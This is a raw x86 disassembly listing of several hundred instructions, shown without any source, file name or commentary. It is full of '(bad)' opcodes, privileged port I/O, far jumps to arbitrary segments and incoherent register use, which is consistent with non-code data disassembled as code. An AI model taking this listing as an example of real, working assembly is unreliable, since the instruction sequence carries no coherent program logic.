  52c1a7:	jg     0x52c18d
  52c1a9:	xchg   ecx,eax
  52c1aa:	jp     0x52c144
  52c1ac:	addr16 loop 0x52c18d
  52c1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52c1b0:	scas   eax,DWORD PTR es:[edi]
  52c1b1:	xchg   BYTE PTR [ebp+0x56],bl
  52c1b4:	inc    edx
  52c1b5:	dec    esp
  52c1b6:	leave  
  52c1b7:	push   es
  52c1b8:	clc    
  52c1b9:	pop    ebp
  52c1ba:	shl    BYTE PTR [ecx+0x1bc7cb32],0x41
  52c1c1:	popa   
  52c1c2:	clc    
  52c1c3:	push   ds
  52c1c4:	leave  
  52c1c5:	out    0x91,eax
  52c1c7:	std    
  52c1c8:	or     al,0x48
  52c1ca:	cwde   
  52c1cb:	leave  
  52c1cc:	mov    dh,0x4a
  52c1ce:	(bad)  
  52c1cf:	call   0x21e29c41
  52c1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52c1d5:	jbe    0x52c15c
  52c1d7:	xchg   ebx,eax
  52c1d8:	sbb    edi,edx
  52c1da:	in     al,dx
  52c1db:	div    BYTE PTR [ebx+0x8]
  52c1de:	loope  0x52c1bf
  52c1e0:	test   eax,0xaee066
  52c1e5:	sbb    BYTE PTR [edx+0x79b1f634],ah
  52c1eb:	int3   
  52c1ec:	ss dec ebp
  52c1ee:	inc    ebp
  52c1ef:	(bad)  
  52c1f0:	(bad)  
  52c1f1:	int3   
  52c1f2:	xor    esi,DWORD PTR [edx+0x7f]
  52c1f5:	and    BYTE PTR [esp+ecx*8-0x4e],0xe9
  52c1fa:	shl    DWORD PTR [ebx+0x29b9dc01],0x70
  52c201:	jne    0x52c186
  52c203:	ret    
  52c204:	cs scas al,BYTE PTR es:[edi]
  52c206:	or     ecx,DWORD PTR [ebx+esi*2+0x3b]
  52c20a:	fwait
  52c20b:	and    BYTE PTR [esi],bl
  52c20d:	xor    DWORD PTR [ebx+0x1],eax
  52c210:	xor    DWORD PTR [ecx],eax
  52c212:	shl    DWORD PTR [ecx-0x5e],0x73
  52c216:	mov    WORD PTR [ebx],es
  52c218:	(bad)  
  52c21a:	imul   esi,DWORD PTR [ebx-0x79],0xffffff87
  52c21e:	cmp    bh,BYTE PTR [ebx-0x4a]
  52c221:	inc    esi
  52c222:	push   cs
  52c223:	shr    DWORD PTR [edx],0x7f
  52c226:	xor    edi,DWORD PTR [esi-0xb8e817]
  52c22c:	add    BYTE PTR [esi+0x6edf27],bh
  52c232:	jno    0x52c28d
  52c234:	inc    ebx
  52c235:	push   es
  52c236:	add    dl,bl
  52c238:	pop    ebp
  52c239:	sub    cl,bh
  52c23b:	loop   0x52c255
  52c23d:	mov    ecx,0x8923f9cd
  52c242:	jmp    0x1e3a49ed
  52c247:	ret    0xf870
  52c24a:	inc    ebx
  52c24b:	inc    ebp
  52c24c:	mov    cl,0xb0
  52c24e:	sbb    DWORD PTR [esi-0x3f18f4b5],ebp
  52c254:	sar    DWORD PTR [ebp-0x36],0x8b
  52c258:	mov    al,0xe5
  52c25a:	lds    edi,FWORD PTR [edi]
  52c25c:	lahf   
  52c25d:	cmc    
  52c25e:	or     bh,BYTE PTR [ecx]
  52c260:	test   DWORD PTR [edx],esp
  52c262:	pop    ds
  52c263:	jmp    0xf6526c85
  52c268:	add    DWORD PTR [ebx],ebx
  52c26a:	dec    ebx
  52c26b:	mov    edx,0x8dac7850
  52c270:	gs int 0xf6
  52c273:	aaa    
  52c274:	scas   eax,DWORD PTR es:[edi]
  52c275:	into   
  52c276:	(bad)  
  52c277:	(bad)  
  52c278:	imul   eax,esi,0x21b5d14c
  52c27e:	jmp    0x52c250
  52c280:	push   ecx
  52c281:	clc    
  52c282:	rcl    DWORD PTR [ebp+0x7c],cl
  52c285:	sub    BYTE PTR [ebp+0x23da304a],bl
  52c28b:	mov    eax,0xd6679a50
  52c290:	add    ah,cl
  52c292:	and    eax,0x77b93260
  52c297:	in     al,0xf4
  52c299:	inc    ebx
  52c29a:	shr    DWORD PTR [eax],0x56
  52c29d:	add    al,dh
  52c29f:	push   eax
  52c2a0:	arpl   WORD PTR [esi],dx
  52c2a2:	jg     0x52c2f6
  52c2a4:	add    eax,0x35aa46d6
  52c2a9:	jae    0x52c298
  52c2ab:	fbld   TBYTE PTR [edi]
  52c2ad:	dec    eax
  52c2ae:	inc    esp
  52c2af:	aam    0xd6
  52c2b1:	pushf  
  52c2b2:	adc    eax,0x2ab0c570
  52c2b7:	repz push esp
  52c2b9:	push   ebx
  52c2ba:	into   
  52c2bb:	push   ebx
  52c2bc:	cwde   
  52c2bd:	idiv   BYTE PTR [eax-0x3265642f]
  52c2c3:	pushf  
  52c2c4:	jecxz  0x52c279
  52c2c6:	adc    BYTE PTR [edi],al
  52c2c8:	or     al,0x99
  52c2ca:	mov    ecx,0xe8b7ac75
  52c2cf:	adc    al,0xe8
  52c2d1:	xor    edi,0x54
  52c2d4:	sahf   
  52c2d5:	xchg   BYTE PTR [ebp+0x2e180443],cl
  52c2db:	fst    DWORD PTR [esi]
  52c2dd:	bswap  ecx
  52c2df:	out    dx,eax
  52c2e0:	cmp    al,0x51
  52c2e2:	dec    ebx
  52c2e3:	cmp    edx,DWORD PTR [edx-0x47940a07]
  52c2e9:	cli    
  52c2ea:	leave  
  52c2eb:	aas    
  52c2ec:	mov    al,ds:0xb7f3f7ff
  52c2f1:	inc    edx
  52c2f2:	iret   
  52c2f3:	shl    BYTE PTR [edi+0x1c],1
  52c2f6:	popa   
  52c2f7:	out    dx,al
  52c2f8:	mov    ds:0x62935f79,eax
  52c2fd:	enter  0x93a9,0xa0
  52c301:	pop    eax
  52c302:	retf   
  52c303:	pop    ds
  52c304:	sbb    DWORD PTR [ecx+0x7d],ecx
  52c307:	push   es
  52c308:	sar    BYTE PTR [ebp-0x2f],1
  52c30b:	popf   
  52c30c:	sbb    dh,BYTE PTR [ebx+0x6a]
  52c30f:	(bad)  
  52c311:	xor    ebx,DWORD PTR [eax-0x7f45ca7b]
  52c317:	push   ebx
  52c318:	push   cs
  52c319:	pusha  
  52c31a:	ret    0xb02f
  52c31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c31e:	clc    
  52c31f:	adc    DWORD PTR [eax],ebx
  52c321:	dec    ecx
  52c322:	push   ebx
  52c323:	mov    edi,0x286d24e8
  52c328:	leave  
  52c329:	mov    ecx,0xce63d885
  52c32e:	gs pop edx
  52c330:	adc    DWORD PTR [ecx+0x7c],0xffffffc7
  52c334:	icebp  
  52c335:	cmp    DWORD PTR [esi+0xf68b411],ebp
  52c33b:	sub    DWORD PTR [esi],esi
  52c33d:	adc    bh,dh
  52c33f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52c340:	adc    al,0xb7
  52c342:	out    dx,eax
  52c343:	inc    BYTE PTR [ebp+0x6a9affd2]
  52c349:	jle    0x52c372
  52c34b:	mov    al,ds:0x4d1e2fc
  52c350:	leave  
  52c351:	dec    eax
  52c352:	loopne 0x52c2f6
  52c354:	icebp  
  52c355:	(bad)  
  52c358:	xchg   ebp,eax
  52c359:	xchg   ecx,eax
  52c35a:	js     0x52c3a1
  52c35c:	sub    BYTE PTR [ebx-0x5a],dl
  52c35f:	push   edi
  52c360:	iret   
  52c361:	shl    BYTE PTR [ebp+0x73],cl
  52c364:	pop    edx
  52c365:	pushf  
  52c366:	add    BYTE PTR [ecx-0x29182681],ah
  52c36c:	int3   
  52c36d:	out    0xaf,eax
  52c36f:	and    al,0x56
  52c371:	jle    0x52c3ab
  52c373:	push   edi
  52c374:	jne    0x52c31e
  52c376:	sbb    al,dh
  52c378:	test   BYTE PTR [eax+0x239e1a2],cl
  52c37e:	fwait
  52c37f:	(bad)  
  52c380:	stos   BYTE PTR es:[edi],al
  52c381:	adc    ah,dl
  52c383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52c384:	adc    BYTE PTR ds:0x1c0e0724,ah
  52c38a:	add    al,0x68
  52c38c:	pop    ebx
  52c38d:	aas    
  52c38e:	or     eax,0xd5fc4f21
  52c393:	imul   edi
  52c395:	lahf   
  52c396:	es jle 0x52c38b
  52c399:	xchg   esi,eax
  52c39a:	ret    
  52c39b:	sbb    al,0xbb
  52c39d:	adc    al,BYTE PTR [edx-0x3907b0f9]
  52c3a3:	dec    edx
  52c3a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c3a5:	shl    bh,0xbd
  52c3a8:	(bad)  
  52c3a9:	(bad)  
  52c3aa:	sahf   
  52c3ab:	mov    eax,DWORD PTR [eax]
  52c3ad:	retf   0xdc6
  52c3b0:	cs ret 
  52c3b2:	call   FWORD PTR ds:0x735d7b96
  52c3b8:	sbb    al,0xa6
  52c3ba:	jle    0x52c41d
  52c3bc:	pop    ss
  52c3bd:	outs   dx,BYTE PTR ds:[esi]
  52c3be:	jae    0x52c347
  52c3c0:	add    cl,BYTE PTR [ecx]
  52c3c2:	sbb    ecx,ebp
  52c3c4:	aad    0xc7
  52c3c6:	pushf  
  52c3c7:	mov    ah,0x52
  52c3c9:	mov    edx,0xc1dc02fb
  52c3ce:	in     al,0xde
  52c3d0:	adc    eax,0xf6506b78
  52c3d5:	dec    ebx
  52c3d6:	and    esp,DWORD PTR [edx+0x60]
  52c3d9:	xchg   esi,eax
  52c3da:	pop    esp
  52c3db:	arpl   sp,dx
  52c3dd:	adc    bl,BYTE PTR [ebp+0x7f35f4b6]
  52c3e3:	mov    ds,WORD PTR [ebp+0x42]
  52c3e6:	cli    
  52c3e7:	retf   0x7564
  52c3ea:	(bad)  
  52c3eb:	ss test al,0x2e
  52c3ee:	mov    dl,0xa6
  52c3f0:	comiss xmm2,DWORD PTR [esi+ecx*4-0xc9285d7]
  52c3f8:	iret   
  52c3f9:	fist   WORD PTR [ecx-0x35c10b56]
  52c3ff:	sti    
  52c400:	sub    al,0x2f
  52c402:	loope  0x52c3fd
  52c404:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c406:	or     BYTE PTR [ebp+0x19850281],ch
  52c40c:	pop    esp
  52c40d:	dec    esi
  52c40e:	push   edi
  52c40f:	gs add dh,dh
  52c412:	jnp    0x52c444
  52c414:	push   ds
  52c415:	ss jmp 0x52c476
  52c418:	aam    0xd1
  52c41a:	data16 in al,dx
  52c41c:	jl     0x52c49b
  52c41e:	dec    esi
  52c41f:	xchg   edi,eax
  52c420:	xor    eax,0x74d2c702
  52c425:	xchg   esp,eax
  52c426:	dec    edx
  52c427:	dec    edx
  52c428:	into   
  52c429:	scas   eax,DWORD PTR es:[edi]
  52c42a:	popa   
  52c42b:	mov    ebx,0xd5eb1b9a
  52c430:	loop   0x52c4b1
  52c432:	aaa    
  52c433:	clc    
  52c434:	inc    eax
  52c435:	sub    eax,0x9c72d103
  52c43a:	jmp    DWORD PTR [eax+edi*4]
  52c43d:	les    esp,FWORD PTR [ebp+esi*2-0x512b05e2]
  52c444:	sbb    al,0x37
  52c446:	in     eax,dx
  52c447:	jbe    0x52c3d6
  52c449:	test   DWORD PTR ss:[edi],edi
  52c44c:	jns    0x52c3e2
  52c44e:	or     DWORD PTR ds:0xc30dfb0c,0xffffff93
  52c455:	(bad)  
  52c456:	enter  0xa0e7,0xd9
  52c45a:	jmp    0x52c4b2
  52c45c:	rcr    BYTE PTR [edx+0x5697b52c],cl
  52c462:	(bad)  
  52c463:	aas    
  52c464:	sar    BYTE PTR [edi-0x564dd3c],1
  52c46a:	in     al,dx
  52c46b:	call   FWORD PTR [ebp-0x7a99a4dd]
  52c471:	mov    edi,0xe6f9e50c
  52c476:	leave  
  52c477:	pop    ebp
  52c478:	or     DWORD PTR cs:[esi+0x60eaa175],ebp
  52c47f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  52c481:	jmp    FWORD PTR [eax-0x1a962dba]
  52c487:	jns    0x52c415
  52c489:	bound  eax,QWORD PTR [esi]
  52c48b:	or     al,0x57
  52c48d:	das    
  52c48e:	sti    
  52c48f:	jmp    0x3038:0x25e0cefe
  52c496:	mov    eax,ds:0x94e4879d
  52c49b:	adc    bh,BYTE PTR [ecx+0x4dc231bc]
  52c4a1:	push   eax
  52c4a2:	push   esi
  52c4a3:	shr    ebp,0xa8
  52c4a6:	pop    ds
  52c4a7:	adc    eax,0x24c73643
  52c4ac:	inc    esp
  52c4ad:	sbb    DWORD PTR [edx+0x65],0x97a4ea33
  52c4b4:	pop    edx
  52c4b5:	jp     0x52c4df
  52c4b7:	les    esi,FWORD PTR [ebp-0x27]
  52c4ba:	ds mov eax,0x3ba384d
  52c4c0:	sub    ch,ah
  52c4c2:	jno    0x52c4cb
  52c4c4:	pop    edx
  52c4c5:	push   ebx
  52c4c6:	(bad)  
  52c4c7:	aas    
  52c4c8:	cmp    eax,0xaa89105d
  52c4cd:	into   
  52c4ce:	pop    esp
  52c4cf:	mov    ds:0x31a4a385,eax
  52c4d4:	mov    DWORD PTR [esi],esp
  52c4d6:	cmp    eax,DWORD PTR [ebx]
  52c4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52c4d9:	rcl    BYTE PTR [esi-0x17d813e2],0xbc
  52c4e0:	(bad)  
  52c4e1:	xor    al,0xb3
  52c4e3:	jnp    0x52c4f1
  52c4e5:	sub    al,0x63
  52c4e7:	sub    BYTE PTR [edi+0x3e],ch
  52c4ea:	push   cs
  52c4eb:	push   esp
  52c4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52c4ed:	adc    ah,BYTE PTR [edx-0x7308941d]
  52c4f3:	sbb    BYTE PTR [ecx+0x4d1fd5fc],bh
  52c4f9:	dec    eax
  52c4fa:	sub    ch,BYTE PTR [edx+0x4a18f9be]
  52c500:	test   eax,0xaa026936
  52c505:	leave  
  52c506:	rol    BYTE PTR [esi],cl
  52c508:	inc    ecx
  52c509:	push   eax
  52c50a:	into   
  52c50b:	rcl    DWORD PTR [eax-0x4f61c8f3],1
  52c511:	sub    DWORD PTR [ebx+0x12d927fe],ebx
  52c517:	xlat   BYTE PTR ds:[ebx]
  52c518:	in     eax,dx
  52c519:	fld    TBYTE PTR [ebx+0x6dfec8dd]
  52c51f:	cmc    
  52c520:	cmp    ebp,edx
  52c522:	and    BYTE PTR [eax+edi*1],bh
  52c525:	jge    0x52c589
  52c527:	mov    ch,0x44
  52c529:	push   ss
  52c52a:	sti    
  52c52b:	ror    cl,cl
  52c52d:	mov    ebx,0x25613ad2
  52c532:	sbb    BYTE PTR [ebx-0x17],dh
  52c535:	pop    eax
  52c536:	cmp    esp,edi
  52c538:	(bad)  
  52c539:	pop    ebx
  52c53a:	test   eax,0x24152514
  52c53f:	adc    bh,BYTE PTR [edi+0x6998d3ab]
  52c545:	xor    BYTE PTR [ebp+0x41dc263],ch
  52c54b:	jmp    0x3fee921d
  52c550:	pop    esp
  52c551:	retf   
  52c552:	loopne 0x52c4e7
  52c554:	cli    
  52c555:	mov    ds:0xe8cf5625,al
  52c55a:	mov    al,0xf4
  52c55c:	inc    dl
  52c55e:	iret   
  52c55f:	push   esi
  52c560:	aam    0x1c
  52c562:	cmp    DWORD PTR [esi+esi*4+0x6f0d5b83],eax
  52c569:	mov    esp,0xc8b4ad6c
  52c56e:	ins    DWORD PTR es:[edi],dx
  52c56f:	outs   dx,DWORD PTR ds:[esi]
  52c570:	in     eax,0xed
  52c572:	mov    ebx,0xfb862215
  52c577:	retf   0x57ef
  52c57a:	mov    eax,0xff6d123
  52c57f:	jno    0x52c5f2
  52c581:	leave  
  52c582:	xor    eax,0xc2e8ad48
  52c587:	pop    es
  52c588:	ret    
  52c589:	jecxz  0x52c56d
  52c58b:	enter  0xa406,0x65
  52c58f:	or     BYTE PTR ds:0xf1973aa3,0xc1
  52c596:	jp     0x52c519
  52c598:	daa    
  52c599:	mov    bl,0x11
  52c59b:	or     DWORD PTR [eax-0x15],ebp
  52c59e:	imul   esp,DWORD PTR [eax],0xffffffe2
  52c5a1:	(bad)  
  52c5a3:	shr    BYTE PTR [ebp+0x2c],1
  52c5a6:	jle    0x52c5c6
  52c5a8:	adc    al,0x7f
  52c5aa:	das    
  52c5ab:	lods   eax,DWORD PTR ds:[esi]
  52c5ac:	cwde   
  52c5ad:	adc    al,0x79
  52c5af:	xchg   ecx,eax
  52c5b0:	jbe    0x52c587
  52c5b2:	nop
  52c5b3:	cmp    eax,eax
  52c5b5:	mov    ds:0x25d584ee,eax
  52c5ba:	daa    
  52c5bb:	xchg   edx,eax
  52c5bc:	pushf  
  52c5bd:	push   0xffffff8d
  52c5bf:	inc    edi
  52c5c0:	es inc ebx
  52c5c2:	je     0x52c545
  52c5c4:	cmp    DWORD PTR [ebp-0x7d],edi
  52c5c7:	push   ebp
  52c5c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52c5c9:	cmp    dh,BYTE PTR [ebx]
  52c5cb:	pop    ebp
  52c5cc:	xchg   ecx,eax
  52c5cd:	push   es
  52c5ce:	mov    BYTE PTR [esi],bh
  52c5d0:	xlat   BYTE PTR ds:[ebx]
  52c5d1:	push   0x100b15bb
  52c5d6:	adc    BYTE PTR [ebx],al
  52c5d8:	add    esi,DWORD PTR [di]
  52c5db:	xchg   DWORD PTR [edi],edi
  52c5dd:	or     ebx,DWORD PTR [ecx+0x4a8ec28a]
  52c5e3:	xchg   ebx,eax
  52c5e4:	dec    esi
  52c5e5:	dec    ebp
  52c5e6:	in     eax,0xc6
  52c5e8:	mov    ebp,0xb752a5d1
  52c5ed:	jle    0x52c57e
  52c5ef:	xchg   ecx,eax
  52c5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c5f1:	mov    eax,ds:0xba7a2865
  52c5f6:	sub    dl,BYTE PTR [ebx-0x3d]
  52c5f9:	pop    es
  52c5fa:	push   ds
  52c5fb:	fwait
  52c5fc:	scas   al,BYTE PTR es:[edi]
  52c5fd:	push   es
  52c5fe:	push   cs
  52c5ff:	cld    
  52c600:	xchg   esi,eax
  52c601:	xor    cl,BYTE PTR [ecx+eax*4+0x2f]
  52c605:	push   0xdcceb916
  52c60a:	mov    ch,0x68
  52c60c:	sbb    ebx,ebp
  52c60e:	ret    0x971e
  52c611:	cmp    esp,ecx
  52c613:	xchg   edi,eax
  52c614:	out    0xba,eax
  52c616:	fistp  QWORD PTR [ecx-0x75ef67b7]
  52c61c:	cwde   
  52c61d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c61e:	cmp    DWORD PTR [eax-0x79],edi
  52c621:	scas   al,BYTE PTR es:[edi]
  52c622:	jp     0x52c674
  52c624:	dec    esi
  52c625:	je     0x52c681
  52c627:	popf   
  52c628:	stos   DWORD PTR es:[edi],eax
  52c629:	ret    0x9122
  52c62c:	adc    BYTE PTR [ecx+ecx*4+0x44],0x6e
  52c631:	jmp    0x6ef3:0x501becab
  52c638:	fadd   DWORD PTR [eax+eiz*8]
  52c63b:	pop    edi
  52c63c:	sub    esi,DWORD PTR [ebx]
  52c63e:	loope  0x52c6a3
  52c640:	pop    es
  52c641:	pop    ds
  52c642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52c643:	push   edi
  52c644:	repnz and BYTE PTR [eax+0x5ae659a6],0x51
  52c64c:	rcr    BYTE PTR [ecx-0x3ece0a52],cl
  52c652:	xchg   esi,eax
  52c653:	aad    0xe9
  52c655:	cmp    esi,eax
  52c657:	test   eax,0xb635aa4e
  52c65c:	das    
  52c65d:	and    DWORD PTR [edx],0xffffffff
  52c660:	ins    DWORD PTR es:[edi],dx
  52c661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52c662:	test   DWORD PTR [esi-0x77],ecx
  52c665:	ret    0x1bab
  52c668:	pop    ecx
  52c669:	ret    
  52c66a:	xchg   ebx,eax
  52c66b:	jae    0x52c60a
  52c66d:	lock mov ah,0x47
  52c670:	push   ss
  52c671:	dec    eax
  52c672:	push   ss
  52c673:	addr16 dec edx
  52c675:	push   ebp
  52c676:	mov    ds:0x544f01e,eax
  52c67b:	jle    0x52c66b
  52c67d:	xor    esp,DWORD PTR [edi]
  52c67f:	fwait
  52c680:	cld    
  52c681:	cwde   
  52c682:	sbb    ebp,esp
  52c684:	(bad)  
  52c686:	mov    ebp,0xc7db1560
  52c68b:	sti    
  52c68c:	jmp    FWORD PTR [ebx+0x5c]
  52c68f:	sbb    bl,BYTE PTR [edx-0x4775722e]
  52c695:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  52c697:	and    DWORD PTR [edx+0xd],edx
  52c69a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52c69b:	imul   ebx,DWORD PTR [eax-0x3f16d82f],0x753fa679
  52c6a5:	imul   edi,DWORD PTR [eax],0xd858e7a9
  52c6ab:	fcom   st(2)
  52c6ad:	outs   dx,BYTE PTR ds:[esi]
  52c6ae:	sub    al,0xc7
  52c6b0:	shl    dx,1
  52c6b3:	mov    ebp,0x5d875ba5
  52c6b8:	(bad)  [edx+esi*4+0x6b]
  52c6bc:	pop    esi
  52c6bd:	or     eax,0x355b6af5
  52c6c2:	pop    edi
  52c6c3:	jecxz  0x52c6ec
  52c6c5:	test   eax,0x3bff6536
  52c6ca:	xchg   ebx,eax
  52c6cb:	scas   eax,DWORD PTR es:[edi]
  52c6cc:	push   esi
  52c6cd:	fisub  WORD PTR [eax+0x4c]
  52c6d0:	pop    edx
  52c6d1:	add    ebp,esp
  52c6d3:	sub    al,0x7c
  52c6d5:	aam    0xcb
  52c6d7:	ret    
  52c6d8:	imul   ebp,edx,0xffffffab
  52c6db:	xor    al,0x75
  52c6dd:	or     eax,0xc12f2fb9
  52c6e2:	leave  
  52c6e3:	push   ecx
  52c6e4:	dec    edx
  52c6e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52c6e6:	mov    ecx,0xd6377369
  52c6eb:	int3   
  52c6ec:	sahf   
  52c6ed:	lds    edx,FWORD PTR [ecx]
  52c6ef:	push   ebx
  52c6f0:	and    eax,0xa30950cf
  52c6f5:	imul   DWORD PTR [edi-0x11]
  52c6f8:	cwde   
  52c6f9:	(bad)  
  52c6fb:	mov    bh,0x72
  52c6fd:	xchg   edx,eax
  52c6fe:	loope  0x52c72c
  52c700:	and    ah,ah
  52c702:	sub    eax,0x7b54b3e
  52c707:	adc    eax,0x1068c04
  52c70c:	mov    ah,0x9c
  52c70e:	dec    ebp
  52c70f:	inc    ebx
  52c710:	add    DWORD PTR [eax+0x5063c110],ecx
  52c716:	jmp    0xbcb78770
  52c71b:	loopne 0x52c72e
  52c71d:	sbb    BYTE PTR [ebx-0xc432e23],al
  52c723:	xchg   ebp,eax
  52c724:	or     bh,ch
  52c726:	xor    esi,DWORD PTR [edi+eax*2]
  52c729:	es push edx
  52c72b:	scas   eax,DWORD PTR es:[edi]
  52c72c:	inc    esp
  52c72d:	pop    eax
  52c72e:	xchg   edi,eax
  52c72f:	jge    0x52c6da
  52c731:	je     0x52c6c4
  52c733:	repnz mov dh,0x68
  52c736:	xlat   BYTE PTR ds:[ebx]
  52c737:	mov    eax,ds:0x17102723
  52c73c:	shr    DWORD PTR [eax-0x71],cl
  52c73f:	lods   eax,DWORD PTR ds:[esi]
  52c740:	xor    eax,0x58380f6a
  52c745:	repz sub al,0xa7
  52c748:	out    0xd5,al
  52c74a:	add    bl,bh
  52c74c:	pop    edi
  52c74d:	retf   
  52c74e:	pop    esi
  52c74f:	jp     0x52c777
  52c751:	ins    BYTE PTR es:[edi],dx
  52c752:	xor    al,0x10
  52c754:	and    dh,BYTE PTR [edx]
  52c756:	mov    cl,0x35
  52c758:	mov    ebx,0x33b0ffe0
  52c75d:	test   eax,0xbb4e6c
  52c762:	es jge 0x52c789
  52c765:	push   esi
  52c766:	or     al,0x88
  52c768:	dec    edi
  52c769:	and    ch,BYTE PTR [edi]
  52c76b:	ins    BYTE PTR es:[edi],dx
  52c76c:	fbld   TBYTE PTR [edi]
  52c76e:	xchg   DWORD PTR [edi-0x2],esi
  52c771:	xor    BYTE PTR [edx-0x3b],ah
  52c774:	repnz sbb eax,edi
  52c777:	lahf   
  52c778:	js     0x52c75e
  52c77a:	aad    0x70
  52c77c:	imul   esi,DWORD PTR [ebx+0x6a],0xbb8a279e
  52c783:	pushf  
  52c784:	add    ebp,DWORD PTR [ebx+0x5f]
  52c787:	retf   
  52c788:	out    dx,eax
  52c789:	daa    
  52c78a:	fwait
  52c78b:	ret    0x338c
  52c78e:	std    
  52c78f:	xor    al,0x9a
  52c791:	or     ebx,DWORD PTR [ecx-0x35e2913d]
  52c797:	(bad)  
  52c798:	adc    esi,DWORD PTR [esi-0x65ecdfb4]
  52c79e:	out    dx,eax
  52c79f:	sub    eax,0x43cb559d
  52c7a4:	adc    BYTE PTR [ecx-0x41fea475],bh
  52c7aa:	xchg   esi,eax
  52c7ab:	rol    ebx,cl
  52c7ad:	lock clc 
  52c7af:	pop    ebp
  52c7b0:	pop    ss
  52c7b1:	mov    dh,0xe2
  52c7b3:	out    dx,al
  52c7b4:	jb     0x52c7d9
  52c7b6:	shl    BYTE PTR [edx-0x6b92880d],cl
  52c7bc:	sub    BYTE PTR [ecx-0x3d9f4772],al
  52c7c2:	sbb    esi,0xfffffff7
  52c7c5:	in     al,dx
  52c7c6:	scas   eax,DWORD PTR es:[edi]
  52c7c7:	cmp    DWORD PTR [edi-0x201b1b45],ecx
  52c7cd:	xchg   esi,eax
  52c7ce:	retf   0xf472
  52c7d1:	push   es
  52c7d2:	repz cmp ebp,eax
  52c7d5:	xchg   ebp,eax
  52c7d6:	in     eax,0x94
  52c7d8:	push   edi
  52c7d9:	mov    ah,0x8d
  52c7db:	(bad)  
  52c7dd:	push   0x96f4735a
  52c7e2:	call   0xdebd:0xd1e9b871
  52c7e9:	adc    eax,0x5e5ccb1d
  52c7ee:	scas   al,BYTE PTR es:[edi]
  52c7ef:	in     al,0x79
  52c7f1:	inc    ecx
  52c7f2:	sub    eax,0xb220a9a2
  52c7f7:	or     edi,ebx
  52c7f9:	push   cs
  52c7fa:	idiv   BYTE PTR [edi]
  52c7fc:	push   0x2e0cd3f6
  52c801:	lods   eax,DWORD PTR ds:[esi]
  52c802:	push   edi
  52c803:	cwde   
  52c804:	lahf   
  52c805:	(bad)  
  52c806:	nop
  52c807:	pop    ebx
  52c808:	pop    ebx
  52c809:	dec    ebp
  52c80a:	fadd   DWORD PTR [ebp-0x7c3fbfe8]
  52c810:	inc    esp
  52c811:	adc    eax,0x4c665c0b
  52c816:	push   edi
  52c817:	adc    DWORD PTR [edx],0x3f
  52c81a:	nop
  52c81b:	jbe    0x52c876
  52c81d:	ins    BYTE PTR es:[edi],dx
  52c81e:	retf   0x6265
  52c821:	dec    esi
  52c822:	shl    dh,1
  52c824:	loop   0x52c810
  52c826:	push   esi
  52c827:	or     al,0x92
  52c829:	cmp    esp,DWORD PTR [ecx-0x2b]
  52c82c:	lods   al,BYTE PTR ds:[esi]
  52c82d:	addr16 and edx,0x1f4933e6
  52c834:	aad    0x9d
  52c836:	mov    edi,0x527d3b89
  52c83b:	and    cl,BYTE PTR [edi+0x3c77f415]
  52c841:	dec    ebx
  52c842:	jecxz  0x52c809
  52c844:	inc    ebx
  52c845:	cld    
  52c846:	and    BYTE PTR [edi-0x50c2a7d4],dh
  52c84c:	dec    edi
  52c84d:	inc    esi
  52c84e:	mov    ds:0xadc50e02,eax
  52c853:	stos   DWORD PTR es:[edi],eax
  52c854:	xlat   BYTE PTR ds:[ebx]
  52c855:	pushf  
  52c856:	xchg   esp,eax
  52c857:	fsubr  st,st(0)
  52c859:	adc    BYTE PTR [esi-0x73],bh
  52c85c:	(bad)  
  52c85e:	dec    ebx
  52c85f:	addr16 mov ds:0x4ef,al
  52c863:	mov    bl,0x65
  52c865:	jg     0x52c8be
  52c867:	or     dl,BYTE PTR [esi]
  52c869:	add    eax,0x7ef24c82
  52c86e:	dec    esp
  52c86f:	idiv   DWORD PTR [ebx]
  52c871:	mov    DWORD PTR [esi-0x2e],edi
  52c874:	xchg   edi,eax
  52c875:	jmp    0x5763:0x685c2445
  52c87c:	out    0xba,eax
  52c87e:	ds lock dec eax
  52c881:	xor    al,0xb5
  52c883:	adc    al,0x3a
  52c885:	div    BYTE PTR [ebx-0x65]
  52c888:	imul   esp,DWORD PTR [edx+0x7e0dab0a],0xffffffc6
  52c88f:	dec    ebp
  52c890:	repnz fwait
  52c892:	sub    DWORD PTR [ebx-0x4335560a],ebp
  52c898:	daa    
  52c899:	not    DWORD PTR [esi]
  52c89b:	pop    edi
  52c89c:	sub    eax,0xfc9a3185
  52c8a1:	ret    
  52c8a2:	sub    edi,esp
  52c8a4:	stos   BYTE PTR es:[edi],al
  52c8a5:	sbb    eax,0x2e790617
  52c8aa:	scas   al,BYTE PTR es:[edi]
  52c8ab:	shl    BYTE PTR [di-0xd],1
  52c8af:	test   al,0xbf
  52c8b1:	xchg   esi,eax
  52c8b2:	xchg   BYTE PTR [eax+0x53],al
  52c8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52c8b6:	mov    bl,0x4
  52c8b8:	gs shl dl,cl
  52c8bb:	add    al,0x2e
  52c8bd:	sbb    eax,0x2765c2da
  52c8c2:	xor    al,cl
  52c8c4:	scas   eax,DWORD PTR es:[edi]
  52c8c5:	dec    esp
  52c8c6:	inc    edx
  52c8c7:	jp     0x52c887
  52c8c9:	aam    0xcc
  52c8cb:	into   
  52c8cc:	js     0x52c909
  52c8ce:	mov    esi,DWORD PTR [edi-0x341e42d3]
  52c8d4:	inc    esp
  52c8d5:	mov    ch,0x9d
  52c8d7:	pushf  
  52c8d8:	fwait
